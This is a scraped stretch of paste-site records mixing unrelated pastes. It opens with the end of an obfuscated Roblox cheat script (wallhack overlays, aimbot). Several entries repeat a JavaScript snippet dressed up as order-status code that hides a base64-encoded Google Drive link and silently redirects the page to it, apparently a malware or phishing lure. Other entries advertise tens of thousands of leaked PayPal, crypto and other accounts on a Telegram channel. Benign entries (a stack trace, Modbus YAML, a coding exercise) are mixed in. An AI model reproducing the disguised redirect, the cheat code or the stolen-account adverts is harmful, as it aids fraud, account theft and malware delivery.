in ipairs(v63) do v175:Destroy();end v155=1087 -(461 + 625) ;end if ((1290 -(993 + 295))==v155) then return;end end end local v131=v60.Head;local v132,v133=v21(v131);v64.Visible=v133;v64.Position=v132;v64.Size=v16;local v137=game.Players.LocalPlayer;local v138=v137 and v137.Character ;local v139=v138 and v138:FindFirstChild(v7(""\147\204\79\92\16\180\208\70\111\17\180\205\114\92\12\175"",""\126\219\185\34\61"")) ;if v139 then local v156=(v139.Position-v131.Position).Magnitude;local v157="""";local v158=v7(""\55\231\112\50\74\82\193\213\35\252\99\40\62\89\220"",""\135\108\174\62\18\30\23\147"");local v159=v60:FindFirstChild(v7(""\132\224\45\195\12\238\18\213\187"",""\167\214\137\74\171\120\206\83""));if v159 then local v171=v159.Size;v158=((v171.X>(1 + 0)) and (v171.Y>(1173 -(418 + 753))) and (v171.Z>1) and v7(""\176\217\28\29\204\130\185\194\29\111\197\253\203\201\23\110"",""\199\235\144\82\61\152"")) or v7(""\60\63\151\107\51\51\139\25\40\36\132\113\71\56\150"",""\75\103\118\217"") ;end if v60.Humanoid:FindFirstChild(v7(""\206\90\99\29\189\27\248\92\117\21\181\10\207"",""\126\167\52\16\116\217"")) then v157=""\n[TERROR HP]: ""   .. v60.Humanoid.inside_health.Value ;end if v15[v60] then if (v15[v60]<30) then v64.Color=Color3.new(1 + 0 ,1 + 0 ,0 + 0 );elseif v158:find(v7(""\241\11\19"",""\156\168\78\64\224\212\121"")) then v64.Color=Color3.new(1 + 0 ,529 -(406 + 123) ,1769 -(1749 + 20) );else v64.Color=Color3.new(0 + 0 ,1323 -(1249 + 73) ,0 + 0 );end end local v160=v7(""\60\207\139\225\42\207\137\247\58\180\229"",""\174\103\142\197"")   .. v60.Name ;if v18 then v160=v160   .. ""\n[HP]: ""   .. (v15[v60] or (1145 -(466 + 679)))   .. v157 ;end if v19 then v160=v160   .. ""\n""   .. v158 ;end if v17 then v160=v160   .. ""\n[Distance]: ""   .. math.floor(v156) ;end v64.Text=v160;end end);table.insert(v12,v65);break;end if (v61==(2 -1)) then local v119=0 -0 ;while true do if (v119==(1900 -(106 + 1794))) then v64=Drawing.new(v7(""\54\191\147\35"",""\185\98\218\235\87""));table.insert(v13,v64);v119=1 + 0 ;end if (v119==(1 + 0)) then v64.Size=v16;v61=5 -3 ;break;end end end if (v61==(5 -3)) then v64.Outline=true;v64.Center=true;for v140,v141 in pairs(v62) do local v142=v60:FindFirstChild(v141);if v142 then table.insert(v63,v23(v142));end end v61=117 -(4 + 110) ;end if ((584 -(57 + 527))==v61) then if  not v60.Parent then return;end v62={v7(""\212\82\166\66"",""\38\156\55\199""),v7(""\128\104\113\41\29\123\243\71\154\114\115\60\35\117\232\87"",""\35\200\29\28\72\115\20\154""),v7(""\53\186\215\203\205\13\38\20"",""\84\121\223\177\191\237\76""),v7(""\137\95\206\168\46\16\17\211\182"",""\161\219\54\169\192\90\48\80""),v7(""\101\71\6\49\9\110\5\34"",""\69\41\34\96""),v7(""\142\202\208\2\22\107\144\198\208"",""\75\220\163\183\106\98"")};v63={};v61=1 + 0 ;end end end v10:CreateSlider(v7(""\98\45\71\44\101\109\241\76\45"",""\152\54\72\63\88\69\62""),22 -12 ,30,function(v66) v16=v66;end);v10:CreateToggle(v7(""\231\204\225\75\148\224\231\79\192\197\224\95\209"",""\60\180\164\142""),function(v67) v17=v67;end);v10:CreateToggle(v7(""\107\86\10\62\103\197\34"",""\114\56\62\101\73\71\141""),function(v68) v18=v68;end);v10:CreateToggle(v7(""\139\225\212\211\248\221\254\246\138\198\233\132\139\253\218\208\173\250"",""\164\216\137\187""),function(v69) v19=v69;end);local v25=v10:CreateToggle(v7(""\247\213\1\242\131\240\10\208\234\52\182"",""\107\178\134\81\210\198\158""),function(v70) local v71=0 -0 ;while true do if (v71==(166 -(122 + 44))) then v11=v70;if  not v70 then v20();else ProcessAnomalies();end break;end end end);local v26=workspace.mainGame.active_anomaly;function ProcessAnomalies() local v72=0;local v73;while true do if (v72==(0 -0)) then v73=0 -0 ;while true do if ((0 + 0)==v73) then v20();for v166,v167 in ipairs(v26:GetChildren()) do v22(v167);if v11 then v24(v167);end end v73=1 + 0 ;end if (v73==1) then v26.ChildAdded:Connect(function(v168) local v169=0;local v170;while true do if (v169==(0 -0)) then v170=0;while true do if (v170==0) then v22(v168);if v11 then v24(v168);end break;end end break;end end end);break;end end break;end end end v10:CreateButton(v7(""\27\6\135\197\161\120\43\177\246"",""\202\88\110\226\166""),function() ProcessAnomalies();end);local v27=v9:CreateTab(v7(""\236\27\138\242\216\208"",""\170\163\111\226\151""));local v28=game:GetService(v7(""\61\57\181\48\90\62\39\22"",""\73\113\80\210\88\46\87""));local v29=v28.Brightness;local v30=v28.Ambient;local v31=v28.OutdoorAmbient;local v32=v28.ColorShift_Top;local v33=v28.ColorShift_Bottom;local v34=false;local function v35(v74) local v75=0;while true do if (v75==(65 -(30 + 35))) then v34=v74;if v74 then v28.Brightness=2 + 0 ;v28.Ambient=Color3.new(1,1258 -(1043 + 214) ,3 -2 );v28.OutdoorAmbient=Color3.new(1213 -(323 + 889) ,1,2 -1 );v28.ColorShift_Top=Color3.new(580 -(361 + 219) ,320 -(53 + 267) ,0 + 0 );v28.ColorShift_Bottom=Color3.new(413 -(15 + 398) ,982 -(18 + 964) ,0);else v28.Brightness=v29;v28.Ambient=v30;v28.OutdoorAmbient=v31;v28.ColorShift_Top=v32;v28.ColorShift_Bottom=v33;end break;end end end v27:CreateToggle(v7(""\167\57\193\30\197\147\37\202\26\243"",""\135\225\76\173\114""),function(v76) v35(v76);end);local v36=false;local v37=false;local v38=752 -552 ;local v39=v7(""\50\232\185\180"",""\199\122\141\216\208\204\221"");local v40=false;local v41=game:GetService(v7(""\152\206\21\226\81\248\189\200\4\195\125\228\187\212\19\245"",""\150\205\189\112\144\24""));v27:CreateToggle(v7(""\4\141\178\78\11\156"",""\112\69\228\223\44\100\232\113""),function(v77) v36=v77;end);v27:CreateSlider(v7(""\242\48\49"",""\230\180\127\103\179\214\28""),12 + 8 ,316 + 184 ,function(v78) v38=v78;end);v27:CreateDropdown(v7(""\188\4\77\82"",""\128\236\101\63\38\132\33""),{v7(""\132\172\16\64"",""\175\204\201\113\36\214\139""),v7(""\111\217\56\221\10\72\197\49\238\11\72\216\5\221\22\83"",""\100\39\172\85\188"")},function(v79) v39=v79;end);v27:CreateToggle(v7(""\154\121\181\140\115\142\112\188\131\56"",""\83\205\24\217\224""),function(v80) v40=v80;end);v41.InputBegan:Connect(function(v81,v82) local v83=0;local v84;while true do if (v83==(126 -(116 + 10))) then v84=0 + 0 ;while true do if (v84==(738 -(542 + 196))) then if v82 then return;end if (v81.UserInputType==Enum.UserInputType.MouseButton2) then v37=true;end break;end end break;end end end);v41.InputEnded:Connect(function(v85,v86) if v86 then return;end if (v85.UserInputType==Enum.UserInputType.MouseButton2) then v37=false;end end);local function v42(v87,v88) local v89=RaycastParams.new();v89.FilterDescendantsInstances={game.Players.LocalPlayer.Character};v89.FilterType=Enum.RaycastFilterType.Blacklist;v89.IgnoreWater=true;local v94=workspace:Raycast(v87,(v88.Position-v87).Unit * (v88.Position-v87).Magnitude ,v89);return  not v94 or v94.Instance:IsDescendantOf(v88.Parent) ;end local function v43() local v95=game.Players.LocalPlayer;local v96=v95.Character;local v97=workspace.CurrentCamera;if ( not v96 or  not v96:FindFirstChild(v7(""\206\192\204\57"",""\93\134\165\173""))) then return nil;end local v98=v97.CFrame.Position;local v99,v100=nil,v38;for v104,v105 in ipairs(workspace.mainGame.active_anomaly:GetChildren()) do local v106=0 + 0 ;local v107;while true do if (v106==(0 + 0)) then v107=v105:FindFirstChild(v39);if v107 then local v163=0;local v164;local v165;while true do if (v163==(0 + 0)) then v164,v165=v97:WorldToViewportPoint(v107.Position);if v165 then local v177=(Vector2.new(v164.X,v164.Y) -(v97.ViewportSize/(4 -2))).Magnitude;if (v177<v100) then if ( not v40 or v42(v98,v107)) then local v182=0;while true do if (v182==0) then v100=v177;v99=v107;break;end end end end end break;end end end break;end end end return v99;end game:GetService(v7(""\140\231\207\241\63\220\164\119\189\247"",""\30\222\146\161\162\90\174\210"")).RenderStepped:Connect(function() local v101=0;local v102;while true do if (1==v101) then if v102 then workspace.CurrentCamera.CFrame=CFrame.new(workspace.CurrentCamera.CFrame.Position,v102.Position);end break;end if (v101==(0 -0)) then if  not (v36 and v37) then return;end v102=v43();v101=1;end end end);ProcessAnomalies();v10:Show();"
KzPNRvuV,Untitled,zebmekey,JavaScript,Thursday 24th of April 2025 02:38:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13342/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5M9c8vgv,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Thursday 24th of April 2025 02:37:48 AM CDT,23143 Accounts Posted On https://t.me/leakedbyeminem
DEB9LQ98,2025-04-24T09:32:43.901453,powerampache,PHP,Thursday 24th of April 2025 02:32:44 AM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:984)
	at android.os.Handler.dispatchMessage(Handler.java:104)
	at android.os.Looper.loopOnce(Looper.java:238)
	at android.os.Looper.loop(Looper.java:357)
	at android.app.ActivityThread.main(ActivityThread.java:8088)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:957)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[]}"
HkZ4MAYq,Products.js,zebmekey,JavaScript,Thursday 24th of April 2025 02:23:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38360/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
kKfSS8Gv,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Thursday 24th of April 2025 02:22:25 AM CDT,33590 Accounts Posted On https://t.me/leakedbyeminem
xZNQTSew,Untitled,tahc81,YAML,Thursday 24th of April 2025 02:17:44 AM CDT,"text_sensor:

  - platform: modbus_controller
    modbus_controller_id: must
    address: 15213
    register_type: holding
    response_size: 2
    raw_encode: HEXBYTES
    name: ""PV Charger error""
    icon: mdi:alert-circle-outline
    lambda: |-
      uint16_t value = modbus_controller::word_from_hex_str(x, 0);
      switch (value) {
        case 1: return std::string(""Hardware protection"");
        case 2: return std::string(""Overcurrent"");
        case 3: return std::string(""Current sensor error"");
        case 4: return std::string(""Overtemperature"");
        case 5: return std::string(""PV voltage is too high"");
        case 6: return std::string(""PV voltage is too low"");
        case 7: return std::string(""Battery voltage is too high"");
        case 8: return std::string(""Battery voltage is too Low"");
        case 9: return std::string(""Current is uncontrollable"");
        case 10: return std::string(""Parameter error"");
        default: return std::string(""None"");
      }
      return x;

  - platform: modbus_controller
    modbus_controller_id: must
    address: 25261
    register_type: holding
    response_size: 2
    raw_encode: HEXBYTES
    name: ""Inverter error 1""
    icon: mdi:alert-circle-outline
    lambda: |-
      uint16_t value = modbus_controller::word_from_hex_str(x, 0);
      switch (value) {
        case 1: return std::string(""Fan is locked when inverter is off"");
        case 2: return std::string(""Inverter transformer over temperature"");
        case 3: return std::string(""Battery voltage is too high"");
        case 4: return std::string(""Battery voltage is too low"");
        case 5: return std::string(""Output short circuited"");
        case 6: return std::string(""Inverter output voltage is high"");
        case 7: return std::string(""Overload time out"");
        case 8: return std::string(""Inverter bus voltage is too high"");
        case 9: return std::string(""Bus soft start failed"");
        case 10: return std::string(""Main relay failed"");
        case 11: return std::string(""Inverter output voltage sensor error"");
        case 12: return std::string(""Inverter grid voltage sensor error"");
        case 13: return std::string(""Inverter output current sensor error"");
        case 14: return std::string(""Inverter grid current sensor error"");
        case 15: return std::string(""Inverter load current sensor error"");
        case 16: return std::string(""Inverter grid over current error"");
        default: return std::string(""None"");
      }
      return x;
  - platform: modbus_controller
    modbus_controller_id: must
    address: 25262
    register_type: holding
    response_size: 2
    raw_encode: HEXBYTES
    name: ""Inverter error 2""
    icon: mdi:alert-circle-outline
    lambda: |-
      uint16_t value = modbus_controller::word_from_hex_str(x, 0);
      switch (value) {
        case 1: return std::string(""Inverter radiator over temperature"");
        case 2: return std::string(""Solar charger battery voltage class error"");
        case 3: return std::string(""Solar charger current sensor error"");
        case 4: return std::string(""Solar charger current is uncontrollable"");
        case 5: return std::string(""Inverter grid voltage is low"");
        case 6: return std::string(""Inverter grid voltage is high"");
        case 7: return std::string(""Inverter grid under frequency"");
        case 8: return std::string(""Inverter grid over frequency"");
        case 9: return std::string(""Inverter over current protection error"");
        case 10: return std::string(""Inverter bus voltage is too low"");
        case 11: return std::string(""Inverter soft start failed"");
        case 12: return std::string(""Over DC voltage in AC output"");
        case 13: return std::string(""Battery connection is open"");
        case 14: return std::string(""Inverter control current sensor error"");
        case 15: return std::string(""Inverter output voltage is too low"");
        default: return std::string(""None"");
      }
      return x;
  - platform: modbus_controller
    modbus_controller_id: must
    address: 25265
    register_type: holding
    response_size: 2
    raw_encode: HEXBYTES
    name: ""Inverter warning 1""
    icon: mdi:alert-circle-outline
    lambda: |-
      uint16_t value = modbus_controller::word_from_hex_str(x, 0);
      switch (value) {
        case 1: return std::string(""Fan is locked when inverter is on"");
        case 2: return std::string(""Fan2 is locked when inverter is on"");
        case 3: return std::string(""Battery is over-charged"");
        case 4: return std::string(""Low battery"");
        case 5: return std::string(""Overload"");
        case 6: return std::string(""Output power derating"");
        case 7: return std::string(""Solar charger stops due to low battery"");
        case 8: return std::string(""Solar charger stops due to high PV voltage"");
        case 9: return std::string(""Solar charger stops due to over load"");
        case 10: return std::string(""Solar charger over temperature"");
        case 11: return std::string(""PV charger communication error "");
        default: return std::string(""None"");
      }
      return x;"
n5dEW9LP,Order.js,zebmekey,JavaScript,Thursday 24th of April 2025 02:08:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24405/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PyxBGj5r,Leaked Accounts - Fresh Hits,Ratqueenkslskskwkw,JavaScript,Thursday 24th of April 2025 02:07:02 AM CDT,75682 Accounts Posted On https://t.me/leakedbyeminem
MuRVYvwm,Market.js,zebmekey,JavaScript,Thursday 24th of April 2025 01:52:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03527/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
QFywQEdP,Untitled,zebmekey,JavaScript,Thursday 24th of April 2025 01:37:17 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02814/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JGATDVqA,Products.js,zebmekey,JavaScript,Thursday 24th of April 2025 01:21:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18182/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ASJVcC40,Order.js,zebmekey,JavaScript,Thursday 24th of April 2025 01:06:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67846/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
bTTfn9ae,Subarray sum equals k (only positive integers),smj007,Python,Thursday 24th of April 2025 12:53:17 AM CDT,"class Solution:
    def subarraySum(self, nums: List[int], k: int) -> int:

        left = 0
        right = 0
        window_sum = 0
        count = 0

        while right < len(nums):
            
            # add the right to the window
            window_sum += nums[right]

            # shrink the window untill we have sum < k
            while window_sum > k:
                window_sum -= nums[left]
                left += 1

            # if current window has sum equal to k
            if window_sum == k:
                count += 1
            
            # expand the window
            right += 1

        return count
"
g1M9nGLy,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Thursday 24th of April 2025 12:51:12 AM CDT,79503 Accounts Posted On https://t.me/leakedbyeminem
mk55bX56,Market.js,zebmekey,JavaScript,Thursday 24th of April 2025 12:51:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/35785/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
